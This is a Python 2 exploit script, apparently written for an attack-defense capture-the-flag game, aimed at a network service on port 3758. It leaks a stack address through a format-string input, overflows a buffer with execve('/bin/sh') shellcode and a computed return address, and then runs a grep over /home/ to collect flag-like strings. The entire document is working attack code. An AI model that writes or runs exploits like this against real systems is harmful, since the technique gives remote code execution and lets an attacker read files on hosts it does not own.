#!/usr/bin/env python2

from socket import *
import sys,string,random,re,struct

def idg(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

IP = sys.argv[1]
TIMEOUT = 3
def readall(s):
    mes=''
    try:
        while 1:
            m = s.recv(1)
            mes += m
    except timeout:
        return mes

shell = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
s = socket(AF_INET,SOCK_STREAM)
s.settimeout(TIMEOUT)
s.connect((IP,3758))
s.send("bake\n")
mes = readall(s)
print mes
rrr = re.findall(r'ssan (\w+)',mes)
if len(rrr)==0:
    print "NOO"
    quit()
tok = rrr[0]
s.send("fillup %"+('0'*random.choice(range(1,100)))+"7$lld\n")
mes = readall(s)
print mes
rr = re.findall(r'by ([0-9a-fA-F]+)',mes)
addr = int(rr[0],10)+15-88-30
print "",rr[0]
s.send("fillup "+ shell+ idg(size=(88-len(shell)))+struct.pack("<Q",addr)+"\n")
print "fillup "+ shell+ "a"*(88-len(shell))+struct.pack("<Q",addr)+"aaaaaaaaaaa\n"
mes = readall(s)
print mes
s.send("eat %s\n" % tok);
print s.recv(1024)
s.send("grep -a -o -R -P '[0-9A-Z]{31}=' /home/;\n")
print readall(s)
